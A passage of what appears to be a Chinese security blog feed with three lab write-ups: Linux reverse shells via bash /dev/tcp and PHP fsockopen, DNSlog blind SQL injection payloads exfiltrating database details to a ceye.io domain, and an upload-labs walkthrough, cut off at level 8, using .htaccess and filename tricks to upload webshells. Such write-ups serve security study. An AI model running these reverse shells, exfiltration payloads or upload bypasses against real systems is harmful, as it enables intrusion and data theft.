7777</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/8ab45ddDa8.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/iliCEIg5cL.png?imageslim" alt="mark"><br><strong>这里通过在kali上监听两个端口，然后在使用CentOS进行反向连接的时候使用到了管道符，管道符的作用是把管道符前的输出作为管道符后的输入，这样的话就可以在远程的6666端口的输入设备（键盘）输入命令，将命令输出传递至本地的<code>/bin/bash</code>，通过本地shell解释执行命令后，将命令执行的结果以及错误输入到远程的7777端口</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/bCG25adDFg.png?imageslim" alt="mark"></p><h3 id="方法4："><a href="#方法4：" class="headerlink" title="方法4："></a>方法4：</h3><p><strong>使用php反弹shell，方法如下</strong><br><strong>首先最简单的一个办法，就是使用php的exec函数执行方法1反弹shell的命令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php- <span class="string">'exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777")'</span></div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/AfJ3e8GI2i.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/Da1d5I1GgL.png?imageslim" alt="mark"><br><strong>还有一个是之前乌云知识库上的一个姿势，使用php的fsockopen去连接远程</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'$sock=fsockopen("ip",port);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/fmLfgB7mg1.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/JbLmF1b3l9.png?imageslim" alt="mark"><br><strong>这个姿势看起来有一些难以理解，尤其是还出现了<code>&lt;&amp;</code>这个符号，当然如果把&amp;看着是取地址符或者是引用，那还是可以理解的，为了更方便的理解，我在这将这条命令稍微修改了一下，类似于前面的第二种方法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'$sock=fsockopen("ip",port);exec("/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3");'</span></div></pre></td></tr></table></figure><p><strong>有了之前的基础，我们知道3代表的是使用fsockopen函数建立socket返回的文件描述符，这里将标准输入，标准输出和标准错误输出都重定向到了远程</strong></p><p><strong>在CentOS上反向连接，输入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'$sock=fsockopen("192.168.0.4",7777);exec("/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3");'</span></div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/1H1Ie6D8Hg.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/B0c9GjFmD5.png?imageslim" alt="mark"><br><strong>注意php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>写这篇文章加上查阅资料花了一天多的时间，感觉自己现在真正的将这四种方法理解透了，能够自己去写一些反弹shell的命令了，所以付出还是值得的，网上还有不少反弹shell的命令，以后自己会不断的补充，It’s the climb!</strong></p><h3 id="有关反弹shell的一些不错的资料"><a href="#有关反弹shell的一些不错的资料" class="headerlink" title="有关反弹shell的一些不错的资料"></a>有关反弹shell的一些不错的资料</h3><p><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" title="Linux下反弹shell的种种方式 - r00tgrok - 博客园" target="_blank" rel="external"><strong>Linux下反弹shell的种种方式 - r00tgrok - 博客园</strong></a></p><p><a href="https://www.anquanke.com/post/id/85712" title="Linux渗透之反弹Shell命令解析 - 有思想的安全新媒体" target="_blank" rel="external"><strong>Linux渗透之反弹Shell命令解析 - 有思想的安全新媒体</strong></a></p><p><a href="https://www.cnblogs.com/jnxb/p/3940593.html" title="Linux nc命令用法收集 - 江南小碧 - 博客园" target="_blank" rel="external"><strong>Linux nc命令用法收集 - 江南小碧 - 博客园</strong></a></p><p><a href="http://www.91ri.org/9367.html" title="Web渗透中的反弹Shell与端口转发的奇淫技巧" target="_blank" rel="external"><strong>Web渗透中的反弹Shell与端口转发的奇淫技巧</strong></a></p><p><a href="https://blog.csdn.net/jlu16/article/details/78987990" title="辨别Linux下的&gt;,&gt;&gt;,&gt;&amp;与&amp;&gt;以及反弹shell语句的理解" target="_blank" rel="external"><strong>辨别Linux下的&gt;,&gt;&gt;,&gt;&amp;与&amp;&gt;以及反弹shell语句的理解</strong></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Linux下几种反弹shell方法的总结与理解&quot;&gt;&lt;a href=&quot;#Linux下几种反弹shell方法的总结与理解&quot; class=&quot;headerlink&quot; title=&quot;Linux下几种反弹shell方法的总结与理解&quot;&gt;&lt;/a&gt;Linux下几种反弹shell方法的总结与理解&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;之前在网上看到很多师傅们总结的linux反弹shell的一些方法，为了更熟练的去运用这些技术，于是自己花精力查了很多资料去理解这些命令的含义，将研究的成果记录在这里，所谓的反弹shell，指的是我们在自己的机器上开启监听，然后在被攻击者的机器上发送连接请求去连接我们的机器，将被攻击者的shell反弹到我们的机器上，下面来介绍分析几种常用的方法&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Linux渗透" scheme="http://yoursite.com/categories/Linux%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="反弹shell" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BC%B9shell/"/>
    
  </entry>
  
  <entry>
    <title>渗透技巧:使用dnslog加快盲注速度</title>
    <link href="http://yoursite.com/2018/06/30/dnslogsqli/"/>
    <id>http://yoursite.com/2018/06/30/dnslogsqli/</id>
    <published>2018-06-30T11:02:43.926Z</published>
    <updated>2018-07-01T08:02:37.396Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透技巧-使用dnslog加快盲注速度"><a href="#渗透技巧-使用dnslog加快盲注速度" class="headerlink" title="渗透技巧:使用dnslog加快盲注速度"></a>渗透技巧:使用dnslog加快盲注速度</h1><p><strong>sql盲注分为基于bool的盲注和基于时间的盲注，大家都知道，盲注是在页面没有显示位并且没有报错信息的时候，通过构造payload使页面返回的内容不同或者是页面响应的时间不同从而去判断出数据库中的数据，不管是bool盲注还是时间盲注，在进行判断的时候都需要一个字符一个字符的去判断，虽然二分法可以加快盲注的速度，但是还有一种更好的办法，那就是使用dnslog，具体过程如下图</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/8aC6fb4hHB.png?imageslim" alt="mark"><br><a id="more"></a><br><strong>由上图可以看出要进行dnslog注入需要几个条件：</strong></p><p><strong>1.web服务器操作系统必须为windows，因为UNC这个东西是windows特有的，关于UNC的解析如下</strong></p><p><strong>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。格式：<code>\\servername\sharename</code>，其中servername是服务器名。sharename是共享资源的名称。目录或文件的UNC名称可以包括共享名称下的目录路径，格式为：<code>\\servername\sharename\directory\filename</code></strong></p><p><strong>2.以mysql为例，数据库的<code>load_file</code>函数必须可用，也就是数据库用户必须要有<code>file_priv</code>权限</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/Ai4HGl7IhG.png?imageslim" alt="mark"></p><p><strong>其次就是mysql的<code>secure_file_priv</code>不为NULL,有些高版本的mysql中的<code>secure_file_priv</code>默认为NULL</strong></p><p><strong><code>secure_file_priv</code>特性<code>secure_file_priv</code>参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</strong></p><pre><code>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出。当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下。当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制。</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/96ilB0fDlj.png?imageslim" alt="mark"></p><p><strong>配置方法，在mysql配置文件中[mysqld]里追加一条<code>secure_file_priv =</code></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/mKDHhh4j1G.png?imageslim" alt="mark"></p><p><strong>符合了上述的两个条件就可以使用dnslog去进行注入了，首先需要有一台自己的DNS服务器，该DNS服务器的作用是用来接收DNS查询日志，从日志中获取dnslog注入的结果，这里推荐使用知道创宇的<a href="http://ceye.io/" title="CEYE平台" target="_blank" rel="external">CEYE平台</a>，注册完成后会分配给用户一个该平台的二级域名，这个二级域名可以作为我们的DNS服务器</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/6A6EkBLkf7.png?imageslim" alt="mark"></p><p><strong>以sqli-labs第九关为例，该关卡是一个时间盲注</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/FaFeEAk4Gh.png?imageslim" alt="mark"><br><strong>传统的时间盲注对网速有着一定的要求，还有就是需要一个一个字符的去判断并且会有一定的延时，效率比较低，这里使用dnslog注入来试一下</strong></p><p><strong>读取数据库版本信息，payload：</strong></p><pre><code>http://192.168.242.128/sqli-labs/Less-9/index.php?id=1&apos; union select load_file(concat(&apos;\\\\&apos;,version(),&apos;.meomna.ceye.io\\abc&apos;)),2,3%23</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/gACd593Dea.png?imageslim" alt="mark"><br><strong>可以在CEYE平台中的DNS Query中看到数据库版本信息</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/aGG44dKHFD.png?imageslim" alt="mark"><br><strong>注意在读取当前用户时，由于<code>root@localhost</code>里的@符号在url里面有别的含义，@符号前面的内容会被当成<code>login:password</code>的格式，所以在查询时要使用hex函数进行16进制编码，否则会查询不到，payload：</strong></p><pre><code>http://192.168.242.128/sqli-labs/Less-9/index.php?id=1&apos; union select load_file(concat(&apos;\\\\&apos;,(select hex(user())),&apos;.meomna.ceye.io\\abc&apos;)),2,3%23</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/Kjh5C1FJKj.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/EH0dChH0IE.png?imageslim" alt="mark"><br><strong>之后进行16进行解码便能得到内容</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/9962c1bbmk.png?imageslim" alt="mark"><br><strong>读取当前的数据库</strong></p><pre><code>http://192.168.242.128/sqli-labs/Less-9/index.php?id=1&apos; union select load_file(concat(&apos;\\\\&apos;,database(),&apos;.meomna.ceye.io\\abc&apos;)),2,3%23</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/3Bg8h43kcD.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/3hmLf064Jm.png?imageslim" alt="mark"><br><strong>读取当前数据库下的所有表，group_concat返回的查询结果中有<code>,</code>,所以要使用hex函数进行16进制编码，否则会查询不到</strong></p><pre><code>http://192.168.242.128/sqli-labs/Less-9/index.php?id=1&apos; union select load_file(concat(&apos;\\\\&apos;,(select hex(group_concat(table_name)) from information_schema.tables where table_schema=database()),&apos;.meomna.ceye.io\\abc&apos;)),2,3%23</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/9j21maLE6F.png?imageslim" alt="mark"><br><strong>之后将得到的内容进行16进制解码就能获取到数据库内容了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/AafjHEfmLj.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;渗透技巧-使用dnslog加快盲注速度&quot;&gt;&lt;a href=&quot;#渗透技巧-使用dnslog加快盲注速度&quot; class=&quot;headerlink&quot; title=&quot;渗透技巧:使用dnslog加快盲注速度&quot;&gt;&lt;/a&gt;渗透技巧:使用dnslog加快盲注速度&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;sql盲注分为基于bool的盲注和基于时间的盲注，大家都知道，盲注是在页面没有显示位并且没有报错信息的时候，通过构造payload使页面返回的内容不同或者是页面响应的时间不同从而去判断出数据库中的数据，不管是bool盲注还是时间盲注，在进行判断的时候都需要一个字符一个字符的去判断，虽然二分法可以加快盲注的速度，但是还有一种更好的办法，那就是使用dnslog，具体过程如下图&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;http://p008biu9n.bkt.clouddn.com/blog/180630/8aC6fb4hHB.png?imageslim&quot; alt=&quot;mark&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="sql注入" scheme="http://yoursite.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs通关教程</title>
    <link href="http://yoursite.com/2018/06/07/upload-labs/"/>
    <id>http://yoursite.com/2018/06/07/upload-labs/</id>
    <published>2018-06-07T08:59:26.827Z</published>
    <updated>2018-06-22T10:06:20.058Z</updated>
    
    <content type="html"><![CDATA[<h1 id="upload-labs通关教程（持续更新）"><a href="#upload-labs通关教程（持续更新）" class="headerlink" title="upload-labs通关教程（持续更新）"></a>upload-labs通关教程（持续更新）</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>最近在圈子里看到的一个文件上传闯关靶场，一共有19关，趁着这个机会做一个教程，以下的内容只是自己的思路，绕过方法有很多种，欢迎大家一起交流，共同学习！</strong><br><a id="more"></a></p><h3 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h3><p><strong>1-18关，操作系统为windows，使用的phpstudy的集成环境，apache版本为2.4.23，所以apache2.2.x的解析漏洞在该环境下不管用，php版本为5.2.17，apache配置文件没有修改过，是默认的配置文件</strong></p><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/hJF374IGLj.png?imageslim" alt="mark"><br><strong>第一关的上传过滤只是在客户端进行过滤的，js对文件后缀名做了白名单限制，任何前端的验证都不算是真正的验证，在这里我使用了4种方式去绕过，这些方法都是绕过前端验证的常用方法</strong></p><p><strong>1.firebug查看元素，将这里的表单的onsubmit事件删除，这样提交表单时便不会触发验证函数</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/1JdGj6CB2H.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/Bdke4Dkjef.png?imageslim" alt="mark"><br><strong>再次上传php就能上传</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/LemHid1HF9.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/HcHKamKIJG.png?imageslim" alt="mark"></p><p><strong>2.firebug控制台重新写一个和过滤函数名字一样的函数，使函数return true,覆盖之前的检查函数</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/gbhk5HiGfa.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/hLa3DDGL2H.png?imageslim" alt="mark"><br><strong>之后上传php也能上传成功</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/CIiCLHFmgd.png?imageslim" alt="mark"></p><p><strong>3.在火狐浏览器中禁用js，在地址栏输入about:config,查找javascript，将javascript.enabled的类型改为false，默认值为true</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/ifIhjCFF3f.png?imageslim" alt="mark"><br><strong>禁用了js后就能绕过前端检测上传php了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/gJ8igaDJFH.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/gE4C3I14E4.png?imageslim" alt="mark"></p><p><strong>4.先上传允许的后缀名绕过前端检测，之后burp抓包，在发往服务端的过程中将后缀名再修改为php</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/GBgb52Lbl5.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/HbJ1bgCLI3.png?imageslim" alt="mark"><br><strong>从而绕过了前端验证</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/A8kf34hJH0.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/ajjJkiJKba.png?imageslim" alt="mark"></p><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p><strong>第二关是在服务端做了验证，代码层对文件的MIME类型进行了检查，为了方便理解原理，可以看一下后端的检查代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</div><div class="line">               <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</div><div class="line">               $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">               $is_upload = <span class="keyword">true</span>;</div><div class="line">             &#125;</div><div class="line">       &#125; <span class="keyword">else</span> &#123;</div><div class="line">           $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</div><div class="line">       &#125;</div></pre></td></tr></table></figure><p><strong>有关这种场景的绕过方法，使用burp抓包，修改文件上传的content-type类型为白名单允许的图片MIME类型即可</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/EbBl9m7CaJ.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/70aFbF8Bi3.png?imageslim" alt="mark"><br><strong>然后就可以绕过检测上传成功了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/BlKbi2BAdl.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/Lj3KA6C4G9.png?imageslim" alt="mark"></p><h3 id="第三关-amp-第四关"><a href="#第三关-amp-第四关" class="headerlink" title="第三关&amp;第四关"></a>第三关&amp;第四关</h3><p><strong>第三关的本意其实是想上传一些后缀名为<code>php、php2、php3、php5、phtml</code>等文件去绕过黑名单的,但是apache的配置文件里并没有配置将这些后缀的文件当做php解析</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/GAlJhg7Dcl.png?imageslim" alt="mark"><br><strong>第三关第四关都是黑名单检测，但是在这里黑名单里都没有对.htacess做限制，所以这两关都可以上传.htaccess去绕过，.htaccess文件的内容如下</strong></p><pre><code>&lt;FilesMatch &quot;tony&quot;&gt;    SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p><strong>我们将这样一个.htaccess文件上传到服务器上传目录，这样的话，当apache在解析该目录下的php时，就会按照.htaccess中的要求去解析，只要匹配到了文件名里有tony这个字符串，就会把该文件当成php文件解析</strong></p><p><strong>首先上传这样的一个.htaccess文件</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/KLIm79lKhA.png?imageslim" alt="mark"><br><strong>.htaccess可以上传成功</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/8Ef545ddL5.png?imageslim" alt="mark"><br><strong>接着上传一个黑名单里没有过滤的随意后缀名文件，但是文件名里要有tony，上传一个tony.jpg，内容为一句话木马</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/G5D3FCCCm0.png?imageslim" alt="mark"><br><strong>上传成功，并且tony.jpg会被apache当成php文件解析</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/Fkf5J6Ecgb.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/i4gJ3EHKf4.png?imageslim" alt="mark"><br><strong>第四关也是同样的方法</strong></p><h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p><strong>第五关在第四关的黑名单中又加进了.htaccess，所以上传.htaccess这个思路没戏了</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</div></pre></td></tr></table></figure><p><strong>可以看看过滤内容，过滤的还挺多，这里apache版本为2.4.23，所以apache文件名（x.php.xxx）解析漏洞不能在这用</strong></p><p><strong>并且在做该黑名单检查之前将上传文件后的<code>.</code>和空格字符都给删除了</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</div><div class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></div><div class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</div><div class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></div><div class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</div><div class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</div><div class="line">           $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</div><div class="line">           $is_upload = <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = <span class="string">'此文件不允许上传'</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure><p><strong>这样做是为了防止用户上传是在后缀名后加上<code>.</code>和空格去绕过黑名单，windows在创建文件时会删除后缀名后的<code>.</code>和空格，并且后缀名为php.的文件也是可以当作php解析的（windows和linux环境都可以）</strong></p><p><strong>同时对文件名后缀名大小写写做了检查，防止大小写绕过</strong></p><p><strong>但是通过代码发现在黑名单检查之前处理文件名时只删除了一次<code>.</code>，于是可以上传一个后缀名为<code>php. .</code>的文件去绕过，这个在黑名单检查之前后缀名就会被处理为<code>php.</code></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/68Akdc4jfA.png?imageslim" alt="mark"><br><strong>可以看到成功绕过了上传检测</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/cc2iblBg14.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/fEHFFIHi6K.png?imageslim" alt="mark"></p><h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p><strong>查看过滤代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</div><div class="line">$file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></div><div class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</div><div class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></div><div class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</div><div class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</div><div class="line">        $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</div><div class="line">        $is_upload = <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $msg = <span class="string">'此文件不允许上传'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>相对于第五关的过滤还少了一些，相同的黑名单，但是相比于第五关，这里仅仅删除了文件名后的<code>.</code>，并没有删除空格，所以可以上传一个后缀名为<code>php+空格</code>的文件去绕过黑名单，windows在创建文件时会自动删掉最后的空格</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/D74F0I3CaD.png?imageslim" alt="mark"><br><strong>可以看到成功绕过这里的上传检测</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/J1ckAadb1a.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/kJCf7HFf8m.png?imageslim" alt="mark"></p><h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p><strong>第六关仅仅将文件名后面的点删除了，第七关则是仅仅将文件名后的空格给删除了，这里通过上传后缀名为<code>php.</code>的文件来绕过黑名单</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/DGFjCfbcHh.png?imageslim" alt="mark"><br><strong>成功绕过黑名单上传</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/7AKdha67J2.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180609/JA9H4CcB55.png?imageslim" alt="mark"></p><h3 id="第八关"><a href="#第八关" class="headerlink" 